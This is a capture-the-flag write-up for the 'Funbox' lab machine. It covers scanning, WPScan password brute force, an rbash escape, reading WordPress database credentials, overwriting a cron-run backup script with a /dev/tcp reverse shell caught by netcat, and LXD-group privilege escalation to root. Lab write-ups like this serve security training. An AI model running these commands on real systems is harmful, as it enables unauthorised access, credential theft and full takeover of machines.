# Funbox

## Nmap

```
sudo nmap 192.168.73.77 -p- -sS -sV

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
Add funbox.fritz.box to /etc/hosts.
{% endhint %}

As FTP is open I initially tried anonymous login credentials which are shown to not work in this instance.

![](<../../../.gitbook/assets/image (1467).png>)

Moving over to port 80 we find that we land on a default page for a Wordpress instance.

![](<../../../.gitbook/assets/image (1468).png>)

After a quick look around we find nothing of interest and no further posts made or commented on. Running dirsearch against the target mahcine we find the directory /secret/ and also the file robots.txt.

Robots.txt only contains the following entry: `Disallow: /secret/`.

```
python3 dirsearch.py -u http://funbox.fritz.box/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -R 2 --full-url -t 75 
```

![](<../../../.gitbook/assets/image (1469).png>)

After further directory searching against /secret/ we are unable to find any further information. Running curl against the directory only gives us the output below.

![](<../../../.gitbook/assets/image (1471).png>)

Running WPScan against the host we identify some users and also confirm password logins. Remembering to set the `--passwords` parameter to rockyou.txt

```
wpscan --url http://funbox.fritz.box/ -t 40 -e ap,u1-1000 --passwords /usr/share/wordlists/rockyou.txt --force
```

![](<../../../.gitbook/assets/image (1472).png>)

From here we have the following credentials:

| Username | Password |
| -------- | -------- |
| joe      | 12345    |
| admin    | iubire   |

From here I tried `SSH` as joe and was able to login with the given credentials.

![](<../../../.gitbook/assets/image (1473).png>)

After connecting I tried to `cd` into /opt/ and was given the restricted message by `rbash`.

![](<../../../.gitbook/assets/image (1474).png>)

To escape `rbash` (restricted shell) we can spawn a new shell with Python, export a new path and then spawn a python shell again to gain full command of our shell.

```
python -c 'import os; os.system("/bin/sh")'
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
python -c 'import pty; pty.spawn("/bin/bash")'
```

After doing so you can see we now have full access to commands.

![](<../../../.gitbook/assets/image (1475).png>)

As always whenever you have Wordpress on a target machine ensure to check `/var/www/html/wp-config.php` for database credentials.

![](<../../../.gitbook/assets/image (1476).png>)

Here we have credentials of: `wordpress:wordpress`. Moving into MYSQL with the following command:

```
mysql -u wordpress -p
```

After entering the password I moved into the Wordpress database and viewing all information in the wp\_users table.

```
select * from wp_users;
```

![](<../../../.gitbook/assets/image (1477).png>)

From here I tried to SSH and `su` into funny who is a local user on the machine with the admin password we got from `WPScan` but had no luck here.

Checking out the home directory for the user 'funny' we see when viewing hidden files that a scripts exists called '.backup.sh'.

![](<../../../.gitbook/assets/image (1478).png>)

As we can see this is performing a backup. Looking at the permissions of the file it looks like we can erase the contents and replace it with our own shell.

First I downloaded [pspy64](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0) onto the target system to see if this is something being executed by the system on a regular basis. Ensuring that executable permissions are set with `chmod` before running.

![](<../../../.gitbook/assets/image (1479).png>)

From the results windows we see the bash is being executed on the .backup.sh script.

![](<../../../.gitbook/assets/image (1480).png>)

With this information lets replace .backup.sh contents with a bash reverse shell.

```
echo  > .backup.sh
echo '#!/bin/bash' > .backup.sh
echo 'sh -i >& /dev/tcp/192.168.49.196/80 0>&1' >> .backup.sh
```

![](<../../../.gitbook/assets/image (1481) (1).png>)

Then start a `netcat` listener on our attacking machine.

```
sudo nc -lvp 80
```

After a short while we get a shell as the user funny.

![](<../../../.gitbook/assets/image (1482).png>)

from the above command we see we are part of the 'lxd' group. LXD are Linux containers and when you are a member of this group you can abuse this to gain root privileges.

Run the following commands on the attacking machine:

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

{% hint style="warning" %}
You may run into issues regarding the alpine mirrors on this step. If so follow the link here to [https://github.com/saghul/lxd-alpine-builder/issues/1](https://github.com/saghul/lxd-alpine-builder/issues/1) the issues page for alphine. The comments section contains the solution to the error.
{% endhint %}

![](<../../../.gitbook/assets/image (1483).png>)

After the image has been built we need to transfer over to the target machine. Start a `Python SimpleHTTPServer` and transfer over the alpine image.

```
wget http://192.168.49.196/alpine-v3.13-x86_64-20210418_0849.tar.gz
```

![](<../../../.gitbook/assets/image (1484).png>)

The run the following command to import and create an alias for the alpine image.

```
lxc image import ./alpine-v3.13-x86_64-20210418_0849.tar.gz --alias myimage
```

For this next part if you get the error message 'The command could not be located because '/snap/bin' is not included in the PATH environment variable.' then run the command below to export a new path which includes /snap/bin.

```
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/snap/bin
```

Next we need to initialize LXD.

```
lxd init
```

When initializing you will be given the options below. Its important for this particular machine that when asked \_What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) \_to provide the option **none** otherwise creating a storage pool will fail.

```
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```

Once completed run the commands below to start the container and connect to it with /bin/sh.

```
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

When we execute the last command we will be root inside the container. We then need to move into the directory shown below to move into the main root contents of the primary target.

```
cd /mnt/root/root  
```

![](<../../../.gitbook/assets/image (1485).png>)

We are now root.
